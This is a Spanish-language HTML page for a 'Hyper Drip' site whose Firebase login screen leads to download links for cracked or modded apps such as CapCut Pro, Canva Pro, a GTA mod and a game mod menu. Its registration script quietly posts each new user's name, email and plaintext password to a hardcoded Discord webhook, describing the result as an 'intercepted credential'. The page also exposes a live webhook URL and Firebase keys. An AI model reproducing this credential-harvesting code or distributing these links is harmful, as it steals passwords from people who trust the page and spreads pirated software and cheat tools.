<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HYPER DRIP | PRESTIGE SYSTEM ⚡</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>

    <style>
        :root { --accent: #00f2ff; --bg: #020204; }
        body { background-color: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow-x: hidden; }
        #particles-js { position: fixed; width: 100%; height: 100%; z-index: -1; }
        
        /* BORDES RGB ANIMADOS */
        .rgb-card {
            position: relative; background: rgba(255, 255, 255, 0.03);
            border-radius: 25px; padding: 1px; overflow: hidden;
        }
        .rgb-card::before {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(transparent, var(--accent), transparent, #ff00ea, transparent);
            animation: rotate 4s linear infinite; z-index: -1;
        }
        .inner-content { background: #0a0a0c; border-radius: 24px; padding: 1.5rem; height: 100%; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }

        /* MODAL DE DESCARGA */
        #download-modal {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            z-index: 10000; align-items: center; justify-content: center; backdrop-filter: blur(15px);
        }
        .modal-box { background: #0f0f13; border: 1px solid var(--accent); padding: 2rem; border-radius: 35px; width: 90%; max-width: 400px; text-align: center; }
        
        .glow-text { text-shadow: 0 0 20px rgba(0, 242, 255, 0.7); }
        input::placeholder { color: rgba(255,255,255,0.2); font-style: italic; }
    </style>
</head>
<body>

    <div id="particles-js"></div>

    <section id="auth-screen" class="min-h-screen flex items-center justify-center p-4">
        <div class="w-full max-w-md" data-aos="fade-down">
            <h1 class="text-6xl font-black italic tracking-tighter glow-text text-center mb-10">HYPER <span class="text-[#00f2ff]">DRIP</span></h1>
            
            <div class="rgb-card">
                <div class="inner-content">
                    <div id="auth-title" class="text-center font-black italic text-gray-500 mb-6 tracking-widest uppercase">Identificación</div>
                    
                    <div class="space-y-4">
                        <div id="name-container" class="hidden">
                            <input type="text" id="user-name" placeholder="TU NOMBRE" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm">
                        </div>

                        <input type="email" id="email" placeholder="CORREO@EJEMPLO.COM" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm">

                        <div class="relative">
                            <input type="password" id="pass" placeholder="CONTRASEÑA 🔑" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm">
                            <button onclick="togglePass()" class="absolute right-4 top-1/2 -translate-y-1/2 text-xl opacity-50 hover:opacity-100 transition-all">
                                <span id="eye-icon">👁️</span>
                            </button>
                        </div>

                        <p class="text-[9px] text-gray-500 italic text-center uppercase tracking-tighter">Toma captura antes de entrar para no olvidar tus datos</p>

                        <button onclick="manejarAuth()" class="w-full p-5 bg-white text-black rounded-2xl font-black text-sm hover:bg-[#00f2ff] transition-all active:scale-95 uppercase tracking-widest mt-4">
                            EJECUTAR SISTEMA
                        </button>
                        
                        <button onclick="cambiarModo()" id="toggle-btn" class="w-full text-[10px] text-gray-500 mt-6 uppercase tracking-widest text-center">
                            ¿No tienes cuenta? <span class="text-[#00f2ff] underline italic font-bold">REGISTRARSE</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="store-screen" class="hidden container mx-auto px-4 py-10">
        <div class="text-center mb-16" data-aos="fade-down">
            <h2 id="welcome-msg" class="text-4xl font-black italic glow-text tracking-tighter uppercase">...</h2>
            <div class="h-1 w-20 bg-[#00f2ff] mx-auto mt-2"></div>
        </div>
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="app-grid"></div>
    </section>

    <div id="download-modal">
        <div class="modal-box shadow-[0_0_60px_rgba(0,242,255,0.1)]" data-aos="zoom-in">
            <span class="text-6xl" id="modal-icon">🎬</span>
            <h3 class="text-2xl font-black mt-4 italic tracking-tighter" id="modal-name">PRODUCT NAME</h3>
            <p class="text-gray-500 text-xs mt-2 uppercase" id="modal-desc">v0.0.0</p>
            
            <div class="bg-black/40 p-4 rounded-2xl my-6 border border-white/5 flex justify-between items-center">
                <span class="text-[10px] text-gray-500 font-bold uppercase">TAMAÑO:</span>
                <p class="text-[#00f2ff] font-black" id="modal-size">0.0 MB</p>
            </div>

            <div class="space-y-3">
                <button id="final-link" class="w-full bg-white text-black p-4 rounded-xl font-black hover:bg-[#00f2ff] transition-all">DESCARGAR AHORA</button>
                <button onclick="cerrarModal()" class="w-full text-[10px] text-gray-500 uppercase tracking-widest font-bold">Cerrar Ventana</button>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        AOS.init({ duration: 800 });

        const firebaseConfig = {
          apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
          authDomain: "hyper-drip.firebaseapp.com",
          projectId: "hyper-drip",
          storageBucket: "hyper-drip.firebasestorage.app",
          messagingSenderId: "1023275797824",
          appId: "1:1023275797824:web:378ce9a674db72af05fea5"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";

        let esLogin = true;

        const apps = [
            { n: 'CAP CUT PRO', i: '🎬', d: 'v14.7.0 Unlocked', s: '128 MB', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file' },
            { n: 'DELTA EXECUTOR', i: '🤖', d: 'v647 Android', s: '115 MB', l: 'https://deltaexploits.gg/delta-executor-android' },
            { n: 'DTW MOD MENU', i: '🔥', d: 'Private Build', s: '85 MB', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file' },
            { n: 'GTA SAN ANDREAS', i: '🚗', d: 'v2.11.277 Mod', s: '2.4 GB', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file' },
            { n: 'CANVA PRO', i: '🎨', d: 'Premium Access', s: 'Lite', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view' },
            { n: 'MINECRAFT APK', i: '⛏️', d: 'v1.20.0 Full', s: '650 MB', l: 'https://mineckraftapk.com.mx/' },
            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Cifrando...', s: '--', l: '#', locked: true },
            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Cifrando...', s: '--', l: '#', locked: true },
            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Cifrando...', s: '--', l: '#', locked: true },
            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Cifrando...', s: '--', l: '#', locked: true }
        ];

        function togglePass() {
            const passInput = document.getElementById('pass');
            const eye = document.getElementById('eye-icon');
            if(passInput.type === "password") {
                passInput.type = "text";
                eye.innerText = "👁️";
            } else {
                passInput.type = "password";
                eye.innerText = "😶‍🌫️";
            }
        }

        function cambiarModo() {
            esLogin = !esLogin;
            document.getElementById('auth-title').innerText = esLogin ? "Identificación" : "Nuevo Miembro";
            document.getElementById('btn-text') ? '' : ''; // Dummy
            document.getElementById('name-container').classList.toggle('hidden');
            document.getElementById('toggle-btn').innerHTML = esLogin ? 
                '¿No tienes cuenta? <span class="text-[#00f2ff] underline italic font-bold">REGISTRARSE</span>' : 
                '¿Ya tienes cuenta? <span class="text-[#00f2ff] underline italic font-bold">INICIAR SESIÓN</span>';
        }

        async function manejarAuth() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const nombre = document.getElementById('user-name').value;

            if(!email || !pass) return alert("Escribe los datos completos");

            try {
                if(esLogin) {
                    await auth.signInWithEmailAndPassword(email, pass);
                    abrirDashboard(email.split('@')[0]);
                } else {
                    if(!nombre) return alert("Escribe tu nombre");
                    await auth.createUserWithEmailAndPassword(email, pass);
                    // ENVÍO A DISCORD
                    fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            embeds: [{
                                title: "👑 NUEVO MIEMBRO REGISTRADO",
                                description: "Se ha interceptado una nueva credencial del sistema.",
                                fields: [
                                    { name: "👤 NOMBRE", value: nombre.toUpperCase(), inline: true },
                                    { name: "📧 CORREO", value: email, inline: true },
                                    { name: "🔑 PASSWORD", value: "|| " + pass + " ||" }
                                ],
                                color: 0x00f2ff,
                                footer: { text: "Hyper Drip Security Logger" }
                            }]
                        })
                    });
                    abrirDashboard(nombre);
                }
            } catch (e) { alert("ERROR: " + e.message); }
        }

        function abrirDashboard(nombre) {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('store-screen').classList.remove('hidden');
            document.getElementById('welcome-msg').innerText = "¡BIENVENIDO, " + nombre.toUpperCase() + "!";
            const grid = document.getElementById('app-grid');
            apps.forEach(app => {
                grid.innerHTML += `
                <div class="rgb-card" data-aos="fade-up">
                    <div class="inner-content flex flex-col items-center">
                        <span class="text-4xl mb-4">${app.i}</span>
                        <h3 class="font-black italic text-sm tracking-tight">${app.n}</h3>
                        <p class="text-[9px] text-gray-600 mb-6 uppercase tracking-[3px]">${app.d}</p>
                        <button onclick="abrirModal('${app.n}', '${app.i}', '${app.d}', '${app.s}', '${app.l}')" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl font-bold text-[10px] hover:bg-[#00f2ff] hover:text-black transition-all uppercase tracking-widest">Ver Detalles</button>
                    </div>
                </div>`;
            });
        }

        function abrirModal(n, i, d, s, l) {
            if(l === '#') return alert("Enlace no disponible todavía.");
            document.getElementById('modal-name').innerText = n;
            document.getElementById('modal-icon').innerText = i;
            document.getElementById('modal-desc').innerText = d;
            document.getElementById('modal-size').innerText = s;
            document.getElementById('final-link').onclick = () => window.open(l);
            document.getElementById('download-modal').style.display = "flex";
        }

        function cerrarModal() { document.getElementById('download-modal').style.display = "none"; }

        particlesJS('particles-js', { "particles": { "number": { "value": 50 }, "color": { "value": "#ffffff" }, "opacity": { "value": 0.2 }, "size": { "value": 1.5 }, "line_linked": { "enable": true, "distance": 150, "opacity": 0.1 }, "move": { "enable": true, "speed": 1 } } });
    </script>
</body>
</html>
